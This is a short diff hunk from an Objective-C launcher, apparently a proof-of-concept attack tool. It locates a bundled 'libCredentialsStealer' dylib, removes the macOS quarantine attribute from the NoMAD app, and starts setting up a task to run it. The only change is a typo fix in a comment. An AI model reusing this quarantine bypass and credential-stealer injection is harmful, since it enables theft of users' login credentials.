@@ -7,7 +7,7 @@ int main(int argc, const char * argv[]) {
     NSString *NoMADExecutablePath = [NoMADPath stringByAppendingString:@"/Contents/MacOS/NoMAD"];
     NSString *CredentialsStealerDylibPath = [[NSBundle mainBundle] pathForResource:@"libCredentialsStealer" ofType:@"dylib"];
     
-    // make sure that no quarantine is be applied
+    // make sure that no quarantine is applied
     removexattr([NoMADPath cStringUsingEncoding:NSUTF8StringEncoding], "com.apple.quarantine", 0);
     
     NSTask *task = [NSTask new];
